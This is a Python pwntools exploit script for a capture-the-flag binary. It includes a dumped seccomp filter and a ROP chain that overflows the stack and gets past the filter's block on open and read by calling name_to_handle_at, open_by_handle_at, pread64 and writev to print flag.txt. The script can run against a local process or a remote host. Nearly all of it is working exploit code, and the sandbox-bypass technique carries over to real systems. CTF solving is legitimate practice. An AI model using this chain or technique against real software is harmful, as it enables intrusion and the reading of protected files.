#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('kumbavu_zako')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+132
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x1c 0xc000003e  if (A != ARCH_X86_64) goto 0030
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  if (A != 0xffffffff) goto 0030
 0005: 0x15 0x18 0x00 0x00000000  if (A == read) goto 0030
 0006: 0x15 0x17 0x00 0x00000001  if (A == write) goto 0030
 0007: 0x15 0x16 0x00 0x00000002  if (A == open) goto 0030
 0008: 0x15 0x15 0x00 0x00000003  if (A == close) goto 0030
 0009: 0x15 0x14 0x00 0x00000009  if (A == mmap) goto 0030
 0010: 0x15 0x13 0x00 0x0000000a  if (A == mprotect) goto 0030
 0011: 0x15 0x12 0x00 0x0000000b  if (A == munmap) goto 0030
 0012: 0x15 0x11 0x00 0x00000012  if (A == pwrite64) goto 0030
 0013: 0x15 0x10 0x00 0x00000013  if (A == readv) goto 0030
 0014: 0x15 0x0f 0x00 0x00000028  if (A == sendfile) goto 0030
 0015: 0x15 0x0e 0x00 0x00000038  if (A == clone) goto 0030
 0016: 0x15 0x0d 0x00 0x00000039  if (A == fork) goto 0030
 0017: 0x15 0x0c 0x00 0x0000003a  if (A == vfork) goto 0030
 0018: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0030
 0019: 0x15 0x0a 0x00 0x0000003e  if (A == kill) goto 0030
 0020: 0x15 0x09 0x00 0x00000101  if (A == openat) goto 0030
 0021: 0x15 0x08 0x00 0x00000127  if (A == preadv) goto 0030
 0022: 0x15 0x07 0x00 0x00000128  if (A == pwritev) goto 0030
 0023: 0x15 0x06 0x00 0x00000136  if (A == process_vm_readv) goto 0030
 0024: 0x15 0x05 0x00 0x00000137  if (A == process_vm_writev) goto 0030
 0025: 0x15 0x04 0x00 0x00000142  if (A == execveat) goto 0030
 0026: 0x15 0x03 0x00 0x00000147  if (A == preadv2) goto 0030
 0027: 0x15 0x02 0x00 0x00000148  if (A == pwritev2) goto 0030
 0028: 0x15 0x01 0x00 0x000001b5  if (A == 0x1b5) goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0030: 0x06 0x00 0x00 0x00000000  return KILL
"""

def init():
    global io

    io = start()


def name_to_handle_at(dir_fd, pathname, file_handle_ptr, mount_id, flags):
    SYS_name_to_handle_at = 0x12f
    pop_r8_r9_r10 = 0x4012a2 # pop r8; pop r9; pop r10; ret;

    chain = flat(
        [
            pop_rdi,
            dir_fd,
            pop_rsi,
            pathname,
            pop_rdx,
            file_handle_ptr,
            pop_r8_r9_r10,
            flags,
            0x0,
            mount_id,
            pop_rax,
            SYS_name_to_handle_at,
            syscall
        ]
    )

    return chain


def open_by_handle_at(mount_fd, file_handle_ptr, flags):
    SYS_open_by_handle_at = 0x130

    chain = flat(
        [
            pop_rdi,
            mount_fd,
            pop_rsi,
            file_handle_ptr,
            pop_rdx,
            flags,
            pop_rax,
            SYS_open_by_handle_at,
            syscall
        ]
    )

    return chain


def pread64(fd, buf, count, pos):
    SYS_pread64 = 0x11
    
    chain = flat(
        [
            pop_rdi,
            fd,
            pop_rsi,
            buf,
            pop_rdx,
            count,
            pop_r10,
            0,
            pop_rax,
            SYS_pread64,
            syscall
        ]
    )

    return chain


def writev(fd, iov_struct, iovcnt):
    SYS_writev = 0x14
    
    chain = flat(
        [
            pop_rdi,
            fd,
            pop_rsi,
            iov_struct,
            pop_rdx,
            iovcnt,
            pop_rax,
            SYS_writev,
            syscall
        ]
    )

    return chain


def write_what_where(what, where):
    mov_qword = 0x401296 # mov qword ptr [rsi], rdi; ret;

    chain = flat(
        [
            pop_rdi,
            what,
            pop_rsi,
            where,
            mov_qword
        ]
    )

    return chain



def solve():

    global syscall, pop_rax, pop_rdi, pop_rsi, pop_rdx, pop_r10

    pop_rax = 0x40129a # pop rax; ret;
    pop_rdi = 0x40129c # pop rdi; ret;
    pop_rsi = 0x40129e # pop rsi; ret;
    pop_rdx = 0x4012a0 # pop rdx; ret;
    pop_r10 = 0x4012a6 # pop r10; ret;
    syscall = 0x4012b4 # syscall; ret;

    pathname = 0x405700
    file_handle_ptr = 0x405300
    mount_id = 0x405350
    buf = 0x405800
    iov = 0x405720
    filename = b"flag.txt"
    offset = 72

    hmm = 0x401311 # mov rdi, rax; call 0x1180; nop; pop rbp; ret;

    payload = flat({
        offset: [
            write_what_where(filename, pathname),
            write_what_where(128, file_handle_ptr),
            name_to_handle_at(-100, pathname, file_handle_ptr, mount_id, 0),
            open_by_handle_at(3, file_handle_ptr, 0),
            pread64(4, buf, 0x100, 0),
            write_what_where(buf, iov),
            write_what_where(0x100, iov+8),
            writev(1, iov, 1)
        ]
    })

    io.sendlineafter(b"-> ", b"1")
    io.sendlineafter(b"some:", payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

